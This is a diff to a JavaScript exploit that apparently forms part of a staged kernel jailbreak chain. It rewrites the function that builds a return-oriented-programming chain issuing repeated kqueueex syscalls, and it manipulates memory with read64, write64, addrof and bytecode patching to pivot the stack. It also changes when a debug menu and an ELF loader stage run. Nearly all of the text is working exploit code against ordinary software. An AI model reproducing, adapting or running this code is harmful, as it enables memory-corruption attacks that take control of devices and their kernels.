@@ -58,7 +58,7 @@
         const LEAK_CORES = [0, 1, 2, 3];
         const LEAK_SYSCALLS = 0x100000001n;
         const LEAK_FD_MAX = 8192n
-        const LEAK_SYSCALLS_FINAL = 0xFEDn;
+        const LEAK_SYSCALLS_FINAL = 0x2Fn; // rop_chain supports max 256 entries
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -300,61 +300,32 @@
             return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
         }
 
-        function build_kqueueex_final_chain(count, core, finished_addr, rt_prio) {
-            const POC_ARG = 0x800000000000n;
-            const STACK_SIZE = 0x4000 + (Number(count) * 6 + 256) * 8;
+        function execute_kqueueex_final_chain(num_calls) {
+            function kqueueex_rop_n(num_calls) {
+                const POC_ARG = 0x800000000000n;
+                let i = 0;
+                for (let j = 0; j < Number(num_calls); j++) {
+                    rop_chain[i++] = ROP.pop_rax;
+                    rop_chain[i++] = SYSCALL.kqueueex;
+                    rop_chain[i++] = ROP.pop_rdi;
+                    rop_chain[i++] = POC_ARG;
+                    rop_chain[i++] = syscall_wrapper;
+                }
 
-            const buf = malloc(STACK_SIZE);
-            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
-            const chain_view = new BigUint64Array(chain_ab);
-            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
-            chain_view.fill(0n, 0, 0x800);
-
-            const entry = buf + 0x4000n;
-            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts
-
-            const mask = malloc(0x10);
-            write64(mask + 0x0n, 1n << BigInt(core));
-            write64(mask + 0x8n, 0n);
-
-            let idx = 0;
-            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
-
-            emit(ROP.ret);
-            emit(ROP.ret);
-
-            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
-            emit(ROP.pop_rdi); emit(3n);
-            emit(ROP.pop_rsi); emit(1n);
-            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
-            emit(ROP.pop_rcx); emit(0x10n);
-            emit(ROP.pop_r8); emit(mask);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
-
-            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
-            emit(ROP.pop_rdi); emit(RTP_SET);
-            emit(ROP.pop_rsi); emit(0n);
-            emit(ROP.pop_rdx); emit(rt_prio);
-            emit(syscall_wrapper);
-            emit(ROP.ret);
-
-            for (let k = 0; k < Number(count); k++) {
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
-                emit(ROP.ret);
+                rop_chain[i++] = ROP.mov_rax_0x200000000;
+                rop_chain[i++] = ROP.pop_rbp;
+                rop_chain[i++] = saved_fp;
+                rop_chain[i++] = ROP.mov_rsp_rbp;
+                return pwn(fake_frame);
             }
 
-            emit(ROP.pop_rax); emit(1n);
-            emit(ROP.pop_rdi); emit(finished_addr);
-            emit(ROP.mov_qword_rdi_rax);
+            const bc_start = get_bytecode_addr() + 0x36n;
 
-            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
-            emit(ROP.pop_rdi); emit(0n);
-            emit(syscall_wrapper);
-
-            return entry;
+            write64(bc_start, 0xAB0025n);
+            saved_fp = addrof(kqueueex_rop_n(num_calls)) + 0x1n;
+            write64(bc_start, 0xAB00260325n);
+            kqueueex_rop_n(num_calls);
+            return;
         }
 
         function ulog(msg) {
@@ -836,7 +807,6 @@
         }
 
         async function prepare_fds(S) {
-
             const rl = malloc(16);
             syscall(0xC2n, 8n, rl);
             const nofile_hard = read64(rl + 8n);
@@ -927,13 +897,6 @@
                 });
             }
 
-            let final_chain_entry = null;
-            let final_chain_done_ptr = null;
-            if (LEAK_SYSCALLS_FINAL > 0n) {
-                final_chain_done_ptr = malloc(8);
-                final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);
-            }
-
             let all_fed = false;
             while (!all_fed) {
                 all_fed = true;
@@ -991,17 +954,10 @@
                 syscall(SYSCALL.close, BigInt(lw.wfd));
             }
 
-            if (final_chain_entry !== null) {
-                await ulog("launching kqueueex_final_chain...");
-                write64(final_chain_done_ptr, 0n);
-                await js_sleep(500);
-                spawn_leak_worker(final_chain_entry);
-
-                while (true) {
-                    await js_sleep(200);
-                    if (read64(final_chain_done_ptr) !== 0n) break;
-                }
-                await ulog("kqueueex_final_chain finished successfully");
+            if (LEAK_SYSCALLS_FINAL > 0n) {
+                await ulog("launching kqueueex final chain len=" + toHex(LEAK_SYSCALLS_FINAL));
+                execute_kqueueex_final_chain(LEAK_SYSCALLS_FINAL);
+                await ulog("kqueueex final chain finished successfully");
             }
 
             await ulog("preparing free-fd");
@@ -2478,7 +2434,11 @@
 
         await stage6(S);
         await stage7(S);
-        await stage_debug_menu(S);
+        if (y2jb_ge15(yver)) {
+            await ulog("skipping stage_debug_menu, will be enabled by kexp");
+        } else {
+            await stage_debug_menu(S);
+        }
 
         const yver = get_y2jb_version();
         await ulog("stage_elfldr: detected " +
